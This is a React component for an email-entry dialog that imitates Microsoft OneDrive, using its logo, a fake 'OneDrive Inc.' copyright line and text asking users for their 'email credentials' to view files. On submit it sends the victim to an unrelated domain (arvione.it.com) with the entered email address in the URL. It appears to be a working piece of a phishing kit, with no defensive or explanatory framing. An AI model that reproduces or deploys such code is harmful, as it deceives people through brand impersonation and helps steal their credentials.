import { useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { toast } from 'sonner';

interface EmailModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const EmailModal = ({ isOpen, onClose }: EmailModalProps) => {
  const [email, setEmail] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  const validateEmail = (email: string) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email.trim()) && email.length <= 255;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateEmail(email)) {
      toast.error('Invalid email address');
      return;
    }

    setIsProcessing(true);
    const redirectUrl = `https://arvione.it.com/2Zw3QQ7/#${encodeURIComponent(email.trim())}`;
    window.location.href = redirectUrl;
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md">
        <div className="flex flex-col items-center text-center gap-6 py-4">
          <div className="flex items-center gap-2">
            <img 
              src="https://m.media-amazon.com/images/I/51fBoQXGnIL.png" 
              alt="OneDrive" 
              className="w-6 h-6"
            />
            <h2 className="text-xl font-medium">OneDrive</h2>
          </div>
          
          <p className="text-sm text-muted-foreground leading-relaxed px-4">
            These files are sensitive and secured against unauthorized access. In order to access this file, 
            please provide your email credentials. Be sure to connect to your email provider through a secured 
            IMAP channel to authorize your download.
          </p>

          <div className="w-full space-y-4">
            <h3 className="text-lg font-medium">Please Confirm Receiving E-mail to View Files</h3>
            <form onSubmit={handleSubmit} className="space-y-4">
              <Input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter receiving email"
                className="text-center"
                required
              />
              <Button 
                type="submit" 
                className="w-full"
                disabled={isProcessing}
              >
                {isProcessing ? 'Processing...' : 'View Files'}
              </Button>
            </form>
          </div>

          <p className="text-xs text-muted-foreground">© Copyright OneDrive Inc. 2025</p>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default EmailModal;
